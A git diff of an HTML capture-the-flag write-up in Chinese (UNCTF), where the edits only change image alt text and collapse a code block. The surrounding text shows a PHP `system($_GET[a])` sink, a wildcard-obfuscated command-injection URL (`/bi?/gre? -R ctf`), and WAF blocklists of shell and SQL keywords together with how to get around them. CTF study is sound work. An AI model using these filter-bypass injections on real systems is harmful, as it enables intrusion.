@@ -271,13 +271,13 @@ echo system($_GET[a]);
 </code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-3.png" alt="screenshot"></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-4.png" alt="screenshot"></p>
 <p>但是都没有，所以直接用 find 命令找，但是也没有结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-5.png" alt="1-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-5.png" alt="screenshot"></p>
 <p>这题正确姿势是用<code>grep -R</code>来找，通过文件内容找 flag</p>
 <blockquote>
 <p>grep -R 参数可以从某个目录开始，递归地查找文件内容</p>
 </blockquote>
 <pre><code>http://183.129.189.60:10026/?a=`/bi?/gre? -R ctf`
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-6.png" alt="1-6"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-6.png" alt="screenshot"></p>
 <p>② 修改后</p>
 <p>出题人将<code>\\</code>换到了<code>\*</code>前面，其他没变</p>
 <pre><code class="php"> if (preg_match(&quot;/\&#39;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))
@@ -391,7 +391,8 @@ class session{
 ?&gt;
 </code></pre>
 <p><code>func.php</code></p>
-<pre><code class="php">&lt;?php
+<details><br><summary>点击展开查看代码</summary><br><code>php
+&lt;?php
 error_reporting(0);
 function waf($str) {
     if(preg_match(&#39;/(and|or|if|select|union|sleep|order|group|by|exp|user|from|where|tables|substr|database|join|greatest|like|not|hex|bin|ascii|md5|benchmark|concat|mid|strcmp|left|right|replace|when|\/|=|&gt;|&lt;|\*|\(|\)|~|%|!|&amp;&amp;|,|&quot;|;|#|\^|-)/i&#39;, $str) == 1) {
@@ -463,8 +464,8 @@ function echo_index() {
     echo base64_decode(&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KICAgIAogICAgPHRpdGxlPmhvbWU8L3RpdGxlPgogICAgPG1ldGEgbmFtZT0icmVuZGVyZXIiIGNvbnRlbnQ9IndlYmtpdCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtc3RhdHVzLWJhci1zdHlsZSIgY29udGVudD0iYmxhY2siPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtY2FwYWJsZSIgY29udGVudD0ieWVzIj4KICAgIDxtZXRhIG5hbWU9ImZvcm1hdC1kZXRlY3Rpb24iIGNvbnRlbnQ9InRlbGVwaG9uZT1ubyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4vaG9tZV9maWxlcy9sYXl1aS5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL2hvbWVfZmlsZXMvZ2xvYmFsLmNzcyIgbWVkaWE9ImFsbCI+CjxsaW5rIHJlbD0icHJlbG9hZCIgaHJlZj0iLi9ob21lX2ZpbGVzL2YoMSkudHh0IiBhcz0ic2NyaXB0Ij48bGluayByZWw9InByZWxvYWQiIGhyZWY9Ii4vaG9tZV9maWxlcy9mLnR4dCIgYXM9InNjcmlwdCI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi9ob21lX2ZpbGVzL2YudHh0Ij48L3NjcmlwdD48L2hlYWQ+Cgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImxheXVpLWxheW91dCBsYXl1aS1sYXlvdXQtYWRtaW4iPgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWhlYWRlciBoZWFkZXIgaGVhZGVyLWRlbW8iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1tYWluIj4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsb2dvIiBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPgogICAgICA8aW1nIHNyYz0iLi9ob21lX2ZpbGVzL2xvZ28ucG5nIj4KICAgIDwvYT4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibGF5dWktbmF2Ij4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLWhpZGUteHMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209bG9nb3V0Ij7pgIDlh7rnmbvlvZU8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtYmFyIiBzdHlsZT0ibGVmdDogNThweDsgdG9wOiA1NXB4OyB3aWR0aDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLXNpZGUgbGF5dWktYmctYmxhY2siPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1zaWRlLXNjcm9sbCI+CiAgICAgICAgICAgICAgICA8dWwgY2xhc3M9ImxheXVpLW5hdiBsYXl1aS1uYXYtdHJlZSBzaXRlLWRlbW8tbmF2IiBsYXktZmlsdGVyPSJkZW1vIj4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLW5hdi1pdGVtZWQiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iamF2YXNjcmlwdDo7IiBocmVmPSJqYXZhc2NyaXB0OjsiPui1m+ajjeenmOexjTxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtbW9yZSI+PC9zcGFuPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGRsIGNsYXNzPSJsYXl1aS1uYXYtY2hpbGQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii4vaG9tZS5waHA/bT1pbmRleCI+5biI5YKF5Lus55qE5paH56ugPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPkNURueahOiHquaIkeS/ruWFuzwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iLi9ob21lLnBocD9tPWRlYnVnIj7kv7HkuZDpg6jov5Dnu7TmiYvlhow8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L2RsPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImxheXVpLW5hdi1iYXIiIHN0eWxlPSJ0b3A6IDUxNy41cHg7IGhlaWdodDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWJvZHkgc2l0ZS1kZW1vIj4KICAgICAgICAgIDxpbWcgc3JjPSIuL2hvbWVfZmlsZXMv6KeG5Zu+LnBuZyI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibGF5dWktZm9vdGVyIGZvb3RlciBmb290ZXItZGVtbyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLW1haW4iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2YoMSkudHh0Ij48L3NjcmlwdD48c2NyaXB0IGFzeW5jPSIiIHNyYz0iLi9ob21lX2ZpbGVzL2Fkc2J5Z29vZ2xlLmpzIj48L3NjcmlwdD4KICAgICAgICA8ZGl2IGNsYXNzPSJzaXRlLXRyZWUtbW9iaWxlIGxheXVpLWhpZGUiPgogICAgICAgICAgICA8aSBjbGFzcz0ibGF5dWktaWNvbiI+7piCPC9pPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLXNoYWRlIj48L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2xheXVpLmpzIiBjaGFyc2V0PSJ1dGYtOCI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBsYXl1aS51c2UoJ2VsZW1lbnQnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmFyIGVsZW1lbnQgPSBsYXl1aS5lbGVtZW50OwoKICAgICAgICAgICAgZWxlbWVudC5vbignbmF2KGRlbW8pJywgZnVuY3Rpb24oZWxlbSkgewogICAgICAgICAgICAgICAgbGF5ZXIubXNnKGVsZW0udGV4dCgpKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93Lmdsb2JhbCA9IHsKICAgICAgICAgICAgcGFnZVR5cGU6ICdkZW1vJywKICAgICAgICAgICAgcHJldmlldzogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICB2YXIgcHJldmlldyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdMQVlfcHJldmlldycpOwogICAgICAgICAgICAgICAgcmV0dXJuIHByZXZpZXcgPyBwcmV2aWV3LmlubmVySFRNTCA6ICcnOwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgCAgICA8L3NjcmlwdD4KICAgIDwvZGl2PgoKCgo8L2JvZHk+PC9odG1sPg==&quot;);
 }
 
-?&gt;
-</code></pre>
+?&gt;</code><br><br> </details> 
+
 <p><code>db.php</code></p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
